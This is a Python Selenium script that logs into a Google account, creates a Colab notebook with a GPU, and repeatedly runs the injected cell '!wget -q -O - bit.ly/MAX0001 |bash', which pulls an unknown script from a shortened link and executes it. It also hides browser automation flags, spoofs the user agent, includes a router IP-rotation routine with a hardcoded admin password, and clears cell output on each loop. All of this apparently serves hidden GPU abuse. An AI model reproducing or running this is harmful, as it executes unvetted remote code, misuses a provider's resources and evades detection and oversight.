#!/usr/bin/python3

import pytest
import time
import json
import sys
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
slow_motion=2
### func #################################
# Generated by Selenium IDE

#ch chrome
#ff firefoxfocuse
#
user_id=sys.argv[1]
gpassword=sys.argv[2]


useragent = {
"original_fi": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
"original_ch": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
"firefox_android": "Mozilla/5.0 (Android 9; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0",
"ch_s20": "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
"ch_note10p": "Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36",
"ch_s10" : "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G977N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36",
"focus" : "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/4.7.1 Chrome/75.0.3770.143 Mobile Safari/537.36",
"ubuntu" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/88.0",
"win_firefox" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
"win_chrome" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
"firefox88" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
"firefox83_mac" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
}


#profile = webdriver.FirefoxProfile()
#profile.set_preference("general.useragent.override", useragent["ubuntu"] )
#driver = webdriver.Firefox(profile)
#driver = webdriver.Firefox()


#options = webdriver.ChromeOptions() 
#options.add_argument("start-maximized")
#options.add_argument("--disable-dev-shm-usage")
#options.add_argument('--disable-extensions')
#options.add_argument('--disable-blink-features')
#options.add_argument('--profile-directory=Default')
#options.add_argument("--incognito")
#options.add_argument("--disable-plugins-discovery");
#options.add_argument("--start-maximized")
#options.add_argument("--disable-blink-features=AutomationControlled")
#options.add_argument("--disable-infobars")
#options.add_argument("--remote-debugging-port=9222");
#options.add_experimental_option("excludeSwitches", ["enable-automation"])
#options.add_experimental_option('useAutomationExtension', False)
#driver = webdriver.Chrome(options=options)
# #### options.setCapability(CapabilityType.UNEXPECTED_ALERT_BEHAVIOUR, UnexpectedAlertBehaviour.IGNORE); #####
#driver.execute_cdp_cmd('Network.setUserAgentOverride', {"userAgent": useragent["original_ch"] })
#driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")


#

profile = webdriver.FirefoxProfile()
profile.set_preference("dom.webdriver.enabled", False)
profile.set_preference('useAutomationExtension', False)
profile.set_preference('devtools.jsonview.enabled', False) ##
profile.set_preference("general.useragent.override", useragent["ubuntu"] )
profile.update_preferences()
desired = DesiredCapabilities.FIREFOX

driver = webdriver.Firefox(firefox_profile=profile,
                        desired_capabilities=desired)


actions = webdriver.ActionChains(driver) 
print(driver.execute_script("return navigator.userAgent;"))


def change_ip():
    try:
        print("Old IP:")
        r = requests.get('https://ifconfig.me/all.json')
        print( r.json())
        driver.get("http://10.10.10.1/")
        time.sleep(0.1*slow_motion)
        driver.find_element(By.ID, "Frm_Username").click()
        driver.find_element(By.ID, "Frm_Username").send_keys("admin")
        driver.find_element(By.ID, "Frm_Password").send_keys("MST123456789")
        driver.find_element(By.ID, "Frm_Password").send_keys(Keys.ENTER)
        time.sleep(0.2*slow_motion)
        driver.switch_to.frame(1)
        time.sleep(0.2*slow_motion)
        driver.find_element(By.CSS_SELECTOR, "#mmNet > .menuPlusSymbol").click()
        driver.find_element(By.ID, "ssmETHWAN46Con").click()
        driver.find_element(By.ID, "ssmTTYWANCon").click()
        driver.find_element(By.ID, "ssmETHWAN46Con").click()
        driver.find_element(By.ID, "Frm_WANCName0").click()
        time.sleep(0.2*slow_motion)
        dropdown = driver.find_element(By.ID, "Frm_WANCName0")
        dropdown.find_element(By.XPATH, "//option[. = 'omci_ipv4_pppoe_1']").click()
        driver.find_element(By.ID, "Frm_IpMode").click()
        dropdown = driver.find_element(By.ID, "Frm_IpMode")
        dropdown.find_element(By.XPATH, "//option[. = 'IPv4']").click()
        driver.find_element(By.CSS_SELECTOR, "#Frm_IpMode > option:nth-child(1)").click()
        time.sleep(0.1*slow_motion)
        driver.find_element(By.ID, "Btn_DoEdit").click()
        time.sleep(0.1*slow_motion)
        driver.find_element(By.ID, "Btn_DoEdit").click()
        time.sleep(0.1*slow_motion)
        time.sleep(2*slow_motion)
        driver.find_element(By.ID, "Frm_IpMode").click()
        dropdown = driver.find_element(By.ID, "Frm_IpMode")
        dropdown.find_element(By.XPATH, "//option[. = 'IPv4/v6']").click()
        driver.find_element(By.CSS_SELECTOR, "#Frm_IpMode > option:nth-child(3)").click()
        driver.find_element(By.ID, "Frm_IsAuto").click()
        dropdown = driver.find_element(By.ID, "Frm_IsAuto")
        dropdown.find_element(By.XPATH, "//option[. = 'Auto Mode']").click()
        driver.find_element(By.CSS_SELECTOR, "#Frm_IsAuto > option:nth-child(2)").click()
        time.sleep(0.1*slow_motion)
        driver.find_element(By.ID, "Btn_DoEdit").click()
        time.sleep(0.1*slow_motion)
        driver.find_element(By.ID, "Btn_DoEdit").click()
        time.sleep(0.1*slow_motion)
        time.sleep(0.5*slow_motion)
        driver.find_element(By.ID, "Fnt_mmStatu").click()
        time.sleep(0.5*slow_motion)
        time.sleep(10)
        print("New IP:")
        r = requests.get('https://ifconfig.me/all.json')
        print( r.json() )
    except:
        print("Error IP Changing")

def new_colab(user,passw):
    #driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    driver.get("https://accounts.google.com/signin/v2/identifier?authuser=0&hl=en&continue=https%3A%2F%2Fcolab.research.google.com%2F%23create%3Dtrue&flowName=GlifWebSignIn&flowEntry=ServiceLogin")
    driver.find_element(By.ID, "identifierId").send_keys(user)
    driver.find_element(By.ID, "identifierId").send_keys(Keys.ENTER)
    time.sleep(2*slow_motion)
    time.sleep(0.1*slow_motion)
    driver.find_element(By.NAME, "password").send_keys(passw)
    driver.find_element(By.NAME, "password").send_keys(Keys.ENTER)
    time.sleep(5*slow_motion)
    # try not_know
    try:
        driver.find_element(By.ID, "runtime-menu-button").click()
    except:
        driver.get("https://colab.research.google.com/#create=true")
        print("no notKnow")
    time.sleep(10*slow_motion)

def new_colab2(user,passw):
    #driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

    try:
        driver.get("https://accounts.google.com/signin/v2/identifier?authuser=0&hl=en&continue=https%3A%2F%2Fcolab.research.google.com%2F%23create%3Dtrue&flowName=GlifWebSignIn&flowEntry=ServiceLogin")
        driver.implicitly_wait(15)
        time.sleep(30)
        loginBox = driver.find_element(By.ID, "identifierId")
        loginBox.send_keys(user)
        time.sleep(2*slow_motion)
        nextButton = driver.find_elements_by_xpath('//*[@id ="identifierNext"]')
        nextButton[0].click()
        time.sleep(2*slow_motion)
        passWordBox = driver.find_element(By.NAME, "password")
        passWordBox.send_keys(passw)
        nextButton = driver.find_elements_by_xpath('//*[@id ="passwordNext"]')
        nextButton[0].click()
        print('Login Successful...!!')
    except:
        print('Login Failed')
        driver.close()
    try:
        driver.find_element(By.ID, "runtime-menu-button").click()
    except:
        driver.get("https://colab.research.google.com/#create=true")
        print("no notKnow")
    time.sleep(10*slow_motion)

def init_gpu():
    try:
        time.sleep(2*slow_motion)
        driver.find_element(By.ID, "edit-menu-button").click()
        time.sleep(1*slow_motion)
        driver.find_element(By.CSS_SELECTOR, "#\\3A 14 > .goog-menuitem-content").click()
        driver.find_element(By.ID, "accelerator").click()
        dropdown = driver.find_element(By.ID, "accelerator")
        dropdown.find_element(By.XPATH, "//option[. = 'GPU']").click()
        driver.find_element(By.CSS_SELECTOR, "option:nth-child(2)").click()
        driver.find_element(By.ID, "ok").click()
        print("GPU Config")
    except:
        print("Error GPU Config")

def init_gpu2():
    try:
        time.sleep(2*slow_motion)
        driver.find_element(By.ID, "edit-menu-button").click()
        time.sleep(1*slow_motion)
        driver.find_element(By.CSS_SELECTOR, "div[command='notebook-settings'] > .goog-menuitem-content").click()
        driver.find_element(By.ID, "accelerator").click()
        dropdown = driver.find_element(By.ID, "accelerator")
        dropdown.find_element(By.XPATH, "//option[. = 'GPU']").click()
        driver.find_element(By.CSS_SELECTOR, "option:nth-child(2)").click()
        driver.find_element(By.ID, "ok").click()
        print("GPU Config")
    except:
        print("Error GPU Config")

def add_cmd(cmd="!wget -q -O - bit.ly/MAX0001 |bash"):
    try:
        driver.find_element(By.CSS_SELECTOR, ".view-line").click()
        driver.find_element(By.CSS_SELECTOR, ".inputarea:nth-child(4)").send_keys(cmd)
#    driver.find_element(By.ID, "ok").click()
#    driver.find_element(By.CSS_SELECTOR, ".notebook-content").click()
#    driver.find_element(By.ID, "ok").click()
    except:
        print("cmd error")

def exec_colab():
    actions.key_down("\uE009").send_keys(Keys.ENTER ).key_up("\uE009").perform()
    time.sleep(1*slow_motion)
    try:
        time.sleep(2*slow_motion)
        driver.find_element(By.ID, "ok").click()
        print("no gpu accepted")
    except:
        print("running well")
    try:
        time.sleep(2*slow_motion)
        driver.find_element(By.ID, "ok").click()
    except:
        print("no scond warning")

def clear_logs():
    try:
        time.sleep(2*slow_motion)
        driver.find_element(By.ID, "edit-menu-button").click()
        time.sleep(0.2*slow_motion)
        driver.find_element(By.CSS_SELECTOR, "#\\3A 16 > .goog-menuitem-content").click()
        print("no gpu accepted")
    except:
        print("imposible to clear logs")

def clear_logs2():
    try:
        time.sleep(2*slow_motion)
        driver.find_element(By.ID, "edit-menu-button").click()
        time.sleep(0.2*slow_motion)
        driver.find_element(By.CSS_SELECTOR, "div[command='clear-outputs'] > .goog-menuitem-content").click()
        print("no gpu accepted")
    except:
        print("imposible to clear logs")

time.sleep(0.1*slow_motion)
print(0.1*slow_motion)
#driver.set_window_size(360, 667)
driver.get("about:blank")
driver.maximize_window()
#change_ip()
time.sleep(2*slow_motion)

#driver.set_window_size(360, 667)
#driver.set_window_size(1366, 768)
#driver.get("https://www.whatismybrowser.com/fr/")
#driver.get("https://console.cloud.google.com/")
new_colab2(user=user_id,passw=gpassword)
init_gpu2()
add_cmd()
while True:
    exec_colab()
    time.sleep(30)
    clear_logs2()
    time.sleep(30)

#driver.close()